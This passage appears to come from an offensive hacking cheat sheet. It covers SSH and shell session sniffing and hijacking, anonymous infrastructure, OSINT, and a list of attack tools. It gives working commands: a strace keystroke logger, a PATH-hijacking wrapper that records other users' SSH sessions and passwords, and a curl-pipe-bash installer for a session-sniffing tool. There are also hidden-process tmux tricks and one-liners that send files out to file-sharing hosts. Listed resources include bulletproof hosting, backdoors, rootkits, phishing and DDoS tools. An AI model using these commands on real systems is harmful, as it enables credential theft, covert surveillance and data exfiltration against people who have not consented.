	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
}
# tit read $(pidof -s ssh)
# tit read $(pidof -s bash)
# tit write $(pgrep -f 'sshd.*pts' | head -n1)
```
It is also possible to sniff the SSHD process (captures also sudo passwords etc). Note that we trace the `write()` call instead (because sshd 'writes' data to the bash):
```sh
# Find the sshd PID that spawned the bash:
ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'
...
UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
paralle+    7770    7764  0  5088  6780   1 Aug28 ?        00:00:05 sshd: parallels@pts/0
paralle+    9056    9050  0  5088  6652   1 Aug28 ?        00:00:00 sshd: parallels@pts/1
paralle+   11938   11932  0  5074  6772   1 10:59 ?        00:00:00 sshd: parallels@pts/3
...
```

Sniff 7770 (example):
```shell
tit write 7770
```

<a id="ssh-sniffing-wrapper"></a>
**10.v. Sniff a user's outgoing SSH session with a wrapper script**

Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
<details>
  <summary>Show wrapper script - CLICK HERE</summary>

```sh
# Cut & Paste the following into a bash shell:
# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile

# Create a log directory and our own ssh binary
mkdir -p ~/.local/bin ~/.local/logs

cat <<__EOF__ >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -I 1 -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
__EOF__

cat <<__EOF__ >~/.local/bin/ssh-log
#! /bin/bash
grep -F 'read(4' | cut -f2 -d\\" | while read -r x; do
        [[ \${#x} -gt 5 ]] && continue 
        [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
        echo -n "\${x}"
done >\$HOME/.local/logs/ssh-log-"\${1}"-\`date +%s\`.txt
__EOF__

chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
. ~/.profile

echo -e "\033[1;32m***SUCCESS***.
Logfiles stored in ~/.local/.logs/.
To uninstall cut & paste this\033[0m:\033[1;36m
  grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt
  rmdir ~/.local/bin ~/.local/logs ~/.local &>/dev/null \033[0m"
```
(thanks to Gerald for testing this)
</details>

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

<a id="ssh-sniffing-sshit"></a>
**10.vi Sniff a user's outgoing SSH session using SSH-IT**

The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).

```sh
bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
```

<a id="hijack"></a>
**10.vii Hijack / Take-over a running SSH session**  

Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
```sh
ps ax -o pid,ppid,cmd | grep 'ssh '
./reptyr -T <SSH PID>
### or: ./reptyr -T $(pidof -s ssh)
### Must use '-T' or otherwise the original user will see that his SSH process gets suspended.
```

---
<a id="vpn-shell"></a>
## 11. VPN & Shells
<a id="shell"></a>
**11.i. Disposable Root Servers**

```console
$ ssh root@segfault.net # Use password 'segfault'
```

https://thc.org/segfault

<a id="vpn"></a>
**11.ii. VPN/VPS/Proxies**

Trusted VPN Providers
1. https://www.mullvad.net
1. https://www.cryptostorm.is
2. https://ivpn.net
1. https://proton.me - Offers FREE VPN
1. https://vpn.fail - Run by volunteers

Virtual Private Servers. Please check [offshore.cat](https://offshore.cat/).
1. https://www.hetzner.com - Cheap
2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
1. https://dmzhost.co - Ignore most abuse requests
2. https://alexhost.com - No KYC. Bullet Proof. DMCA free zone
3. https://basehost.eu - Ignores court orders
4. https://buyvm.net - Warez best friend
5. https://serverius.net - Used by gangsters
6. https://1984.hosting - Privacy
7. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
8. https://www.privatelayer.com - Swiss based.

See [other KYC Free Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))

Proxies (we dont use any of those)
1. [V2Ray Proxies](https://github.com/mahdibland/V2RayAggregator)
2. [Hola Proxies](https://github.com/snawoot/hola-proxy)
3. [Zaeem's Free Proxy List](https://github.com/Zaeem20/FREE_PROXIES_LIST)
4. [Proxy Broker 2](https://github.com/bluet/proxybroker2)
5. [proxyscrape.com](https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all)
6. [my-proxy.com](https://www.my-proxy.com)
7. [getfreeproxylists.blogspot.com](https://getfreeproxylists.blogspot.com/)
8. [proxypedia.org](https://proxypedia.org/)
9. [socks-proxy.net](https://socks-proxy.net/)
10. [Segfault](https://www.thc.org/segfault): `curl -x socks5h://$(PROXY) ipinfo.io` - selects a random proxy for every request

Many other services (for free)  
1. https://free-for.dev/

---
<a id="osint"></a>
## 12. Intelligence Gathering

Reverse DNS from multiple public databases:
```sh
rdns () {
    curl -m10 -fsSL "https://ip.thc.org/${1:?}?limit=20&f=${2}"
}
# rdns <IP>
```

Find sub domains from TLS/THC-IP Database:
```sh
sub() {
    [ $# -ne 1 ] && { echo >&2 "crt <domain-name>"; return 255; }
    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
    curl -fsSL "https://ip.thc.org/sb/${1:?}"
}
# sub <domain>
```

| OSINT Hacker Tools ||
| --- | --- |
| https://api.c99.nl | Free: [Subdomain Finder](https://subdomainfinder.c99.nl), PAID: Phone-Lookup, CF Resolver, WAF Detector, IP2Host, and more...for $25/year. |  
| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search, and more |
| https://cli.fyi | Free. curl/json interface to many services. Try `curl cli.fyi/me` or `curl cli.fyi/thc.org`. |
| https://check-your-website.server-daten.de | Free. TLS/DNS/Security check a domain. |
| https://ipsniper.info/api.html | rDNS/fDNS and other IP information tools |
| https://ip.thc.org | fDNS/rDNS lookup: `curl -fL ip.thc.org/140.82.121.3` |
| https://hackertarget.com/ip-tools/ | Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support) |
| https://account.shodan.io/billing/tour | Open Port DB & DNS Lookup from around the world |
| https://dnsdumpster.com/ | Domain Recon Tool |
| https://crt.sh/ | TLS Certificate Search |
| https://archive.org/web/ | Historical view of websites |
| https://www.farsightsecurity.com/solutions/dnsdb/ | DNS search (not free) |
| https://wigle.net/ | Wireless Network Mapper |
| https://radiocells.org/ | Cell Tower Information |
| https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |
| https://spur.us/context/me | IP rating `https://spur.us/context/<IP>` |
| http://drs.whoisxmlapi.com | Reverse Whois Lookup (not free) |
| https://www.abuseipdb.com | IP abuse rating |

| OSINT for Detectives ||
| --- | --- |
| https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list | Nixintel's OSINT Resource List |
| https://github.com/jivoi/awesome-osint | Awesome OSINT list |
| https://cipher387.github.io/osint_stuff_tool_collection/ | OSINT tools collection |
| https://osintframework.com/ | Many OSINT tools |

| OSINT Databases ||
| --- | --- |
| https://data.ddosecrets.com/ | Database Dumps

---
<a id="misc"></a>
## 13. Miscellaneous
<a id="tools"></a>
**13.i. Tools of the trade**

Comms
1. [CryptoStorm Email](https://www.cs.email/) - Disposable emails (send & receive). (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
1. [Temp-Mail](https://temp-mail.org/en/) - Disposable email service with great Web GUI. Receive only.
2. [tuta.io](https://tuta.io) or [ProtonMail](https://pm.me)/[.onion](https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion/) - Free & Private email
1. [Quackr.Io](https://quackr.io/) - Disposable SMS/text messages (List of [Disposable-SMS-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services)).
1. [SMS-Man](https://sms-man.com) - Anonymous SMS/text that work with Signal, WA, and manh others 
1. [Crypton](https://crypton.sh/) - Rent a private SIM/SMS with crypto ([.onion](http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/))
2. [List of "No KYC" Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))

OpSec
1. [OpSec for Rebellions](https://medium.com/@hackerschoice/it-security-and-privacy-for-the-rebellions-of-the-world-db4023cadcca) - Start Here. The simplest 3 steps.
1. [RiseUp](https://riseup.net/) - Mail, VPN and Tips for (online) rebellions.
2. [CryptoPad](https://cryptpad.fr)/[DisRoot](https://disroot.org/eng) - IT infra to stage a rebellion.
1. [Neko](https://github.com/m1k1o/neko) - Launch Firefox in Docker and access via 127.0.0.1:8080 (WebRTC)
2. [x11Docker](https://github.com/mviereck/x11docker) - Isolate any X11 app in a container (Linux & Windows only). ([Article](https://techviewleo.com/run-gui-applications-in-docker-using-x11docker/?expand_article=1))
3. [DangerZone](https://github.com/freedomofpress/dangerzone) - Make PDFs safe before opening them.
4. [ExifTool](https://exiftool.org/) - Remove meta data from files (`exiftool -all= example.pdf example1.jpg ...`)
5. [EFF](https://www.eff.org/) - Clever advise for freedom figthers.

Exploits
1. [ttyinject](https://github.com/hackerschoice/ttyinject) and [ptyspy](#10-session-sniffing-and-hijaking) for LPE.
1. [SploitScan](https://github.com/xaitax/SploitScan) - Exploit Score & PoC search (by xaitax)
1. [Traitor](https://github.com/liamg/traitor) - Tries various exploits/vulnerabilities to gain root (LPE)
1. [PacketStorm](https://packetstormsecurity.com) - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
1. [ExploitDB](https://www.exploit-db.com) - Also includes metasploit db and google hacking db
1. [Shodan/Exploits](https://exploits.shodan.io/welcome) - Similar to exploit-db

System Information Gathering
1. `curl -fsSL https://thc.org/ws | bash` - Show all domains hosted on a server + system-information
1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system information for hackers.
1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)
1. https://github.com/The-Z-Labs/linux-exploit-suggester - Suggest exploits based on versions on target system 
1. https://github.com/efchatz/pandora - Windows: dump password from various password managers

Backdoors
1. https://www.gsocket.io/deploy - The world's smallest backdoor
1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
1. https://www.kali.org/tools/weevely - PHP backdoor

Network Scanners
1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
1. https://github.com/ptrrkssn/pnscan - Fast network scanner
1. https://zmap.io/ - ZMap & ZGrab

Vulnerability Scanners (be aware: these all yield 99% non-exploitable false positives. They all suck.)
1. [Raccoon](https://github.com/evyatarmeged/Raccoon) - Reconnaissance and Information Gathering
1. [Osmedeus](https://github.com/j3ssie/osmedeus) - Vulnerability and Information gathering
1. [FullHunt](https://github.com/fullhunt/) - log4j and spring4shell scanner 

DDoS
1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.

Static Binaries / pre-compiled Tools
1. https://bin.pkgforge.dev https://pkgs.pkgforge.dev ([github](https://github.com/pkgforge/soarpkgs), [Soar Project](https://github.com/pkgforge/soar))
1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
2. https://lolbas-project.github.io/ (Windows)
1. https://iq.thc.org/cross-compiling-exploits

Phishing
1. https://github.com/htr-tech/zphisher - We don't hack like this but this is what we would use.
2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah

Tools
1. https://github.com/hackerschoice/bincrypter - Obfuscate & pack _any_ Linux binaries
1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries (ELF only)
1. https://tmate.io/ - Share a screen with others

Callback / Canary / Command & Control
1. https://app.interactsh.com
1. https://api.telegram.org
1. https://webhook.site

Tunneling
1. [Gost](https://github.com/ginuerzh/gost/blob/master/README_en.md)
1. [WireTap](https://github.com/sandialabs/wiretap) or [Segfault's WireGuard](https://www.thc.org/segfault/wireguard/).
1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.

Exfil<a id="cloudexfil"></a>
1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
2. [Segfault.net](https://thc.org/segfault) - type `exfil`
3. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
1. [Mega](https://mega.io/cmd)
2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
3. [0x0.at](https://0x0.st) - `curl -F'file=@foo.txt'  https://0x0.st/`
5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
8. [MagicWormhole](https://pypi.org/project/magic-wormhole/)

Publishing<a id="pub"></a>
1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok
2. [Cloudflare](https://www.cloudflare.com) - The Free-Tier allows most things (dns + domains + tunnels).
1. [Njal.la](https://njal.la) - Privacy focused Domain Registrar
1. [DuckDNS](https://www.duckdns.org/) - Free Domain Names
1. [AnonDNS](https://anondns.net/) - Free Domain Name (anonymous)
1. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
1. [hostwinds](https://hostwinds.com) - Pay with crypto
1. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
1. [he.net](https://dns.he.net/) - Free Nameserver service
1. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
1. [pad.riseup.net](https://pad.riseup.net) - Create documents and share them securely

Forums and Conferences
1. [AlligatorCon](https://www.alligatorcon.eu/) - the original
1. [0x41con](https://0x41con.org/)
1. [TumpiCon](https://tumpicon.org/)
1. [0x00sec](https://0x00sec.org/)

Telegram Channels<a id="channels"></a>
1. [The Hacker's Choice](https://t.me/thcorg)
1. [The Hacker News](https://t.me/thehackernews)
1. [CyberSecurity Technologies](https://t.me/CyberSecurityTechnologies)
1. [Offensive Twitter](https://t.me/OffensiveTwitter)
1. [Pwn3rzs](https://t.me/Pwn3rzs)
1. [VX-Underground](https://t.me/vxunderground)
1. [Android Security / Malware](https://t.me/androidMalware)
1. [OSINT CyberDetective](https://t.me/cybdetective)
1. [BookZillaaa](https://t.me/bookzillaaa)

Mindmaps & Knowledge
1. [Compass Sec Cheat Sheets](https://github.com/CompassSecurity/Hacking_Tools_Cheat_Sheet)
2. [Network Pentesting](https://github.com/wearecaster/NetworkNightmare/blob/main/NetworkNightmare_by_Caster.png)
1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg)

<a id="cool-linux-commands"></a>
**13.ii. Cool Linux commands**

1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
1. https://github.com/ibraheemdev/modern-unix

<a id="tmux"></a>
**13.iii. Tmux Cheat Sheet**


| | Tmux Cheat Sheet |
| --- | --- |
| Max Buffer | `Ctrl-b` + `:` + `set-option -g history-limit 65535` |
| SaveScrollback | `Ctrl-b` + `:` + `capture-pane -S -` followed by `Ctrl-b` + `:` + `save-buffer filename.txt`. |
| SpyScrollback | `tmux capture-pane -e -pS- -t 6.0` to capture pane 6, window 0 of a running tmux. Remove `-e` to save without colour. |
| Clear | `tmux send-keys -R C-l \; clear-history -t6.0` to clear screen and delete scrollback history. |
| Logging | `Ctrl-b` + `:` + `bind-key P pipe-pane -o "exec cat >>$HOME/'tmux-#W-#S.log'" \; display-message 'Toggling ~/tmux-#W-#S.log'`<BR>Press `Ctrl-b` + `Shift + P` to start and stop. |
| HiddenTmux | `cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache`<BR>To attach to your session do <BR>`cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache attach` |
| Attach | Start a new tmux, then type `Ctrl-b` + `s` and use `LEFT`, `RIGHT` to preview and select any session. |
| Menu | `Ctrl-b` + `>`. Then use `Ctrl-b` + `UP`, `DOWN`, `LEFT` or `RIGHT` to move between the panes. |

<a id="useful-commands"></a>
**13.iv. Useful commands**

Use `lsof -Pni` or `netstat -putan` (or `ss -putan`) to list all Internet (_-tu_) connections.

Use `ss -lntp` to show all listening (_-l_) TCP (_-t_) sockets.

Use `netstat -rn` or `ip route show` to show default Internet route.

Use `curl cheat.sh/tar` to get TLDR help for tar. Works with any other linux command.

Use `curl -fsSL bench.sh | bash` to speed test a server.

Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...

Example for the receiving end of a revese tunnel:
```sh
rlwrap --always-readline nc -vnlp 1524
```

Example for *SSH*:
```sh
rlwrap --always-readline ssh user@host
```
---
<a id="hacker"></a>
## 14. How to become a hacker

There are many ways but one is:

1. Use Linux and get proficient with Bash. Learn all Linux commands.
2. Learn how the Internet works. Install and configure some servers (via shell access).
4. Understand System Architecture and how an OS works.
4. Read every book. Ask yourself "why is it done this way and not the other way?".
5. Read the top 10 articles of [Phrack](https://www.phrack.org). 
6. Join a hacker-channel. Sign up to [TryHackMe](https://tryhackme.com/) or [HackTheBox](https://www.hackthebox.com/).
7. Be playful.

---
<a id="others"></a>
## 15. Other Sites

1. [Phineas Fisher](https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/) - No nonsense. Direct. How we like it.
1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
2. [Guacamaya Hackback](https://www.youtube.com/watch?v=5vRIisM0Op4)
3. [Vx Underground](https://www.vx-underground.org/)
4. [HTB absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html) - Well written and explained attack.
5. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
6. [Red Team Notes](https://www.ired.team/)
7. [InfoSec CheatSheet](https://github.com/r1cksec/cheatsheets)
8. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
9. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
10. [Hacking Resources](https://github.com/vitalysim/Awesome-Hacking-Resources)
10. [Awesome Hacking](https://github.com/Hack-with-Github/Awesome-Hacking)
11. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
12. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)


---
Shoutz: ADM, subz/#9x, DrWho, spoty
Join us on [Telegram](https://t.me/thcorg).

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png)](https://www.buymeacoffee.com/hackerschoice)
